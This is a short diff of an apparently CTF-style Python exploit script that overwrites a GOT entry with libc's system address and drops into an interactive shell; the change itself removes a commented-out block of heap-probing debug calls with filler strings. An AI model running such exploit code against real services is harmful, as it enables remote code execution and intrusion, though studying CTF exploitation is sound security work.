@@ -349,25 +349,4 @@ print '[+] '+cible+' (',hex(elf.got[cible]),') -> ',hex(tolibc('system'))
 pdebug(edit(1,tronque("aaaa"+p64(tolibc('system')))))
 p.interactive()
 
-'''
-pdebug(find(2, "conversation?"))
-pdebug(add(255,"000000000000000000000000000000000000000000000000000000000000000000"))
-pdebug(find(2, "conversation?"))
-pdebug(edit(10,"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"))
-pdebug(find(2,"Quote"))
-pdebug(edit(123,"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"))
-pdebug(add (27,"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"))
-pdebug(add (5 ,"CCC"))
-pdebug(find(2,"BBBBB"))
-pdebug(edit(23,"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"))
-pdebug(find(2,"00000000000000000"))
-#                XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-pdebug(edit(123,"qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq\xa1"))
-pdebug(find(2,"AAAAAAAAAAAAAA"))
-raw_input()
-pdebug(edit(12,"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaadddddddddddddddddddddadd1"))
-
-pdebug(list(2))
-'''
-
 p.close()
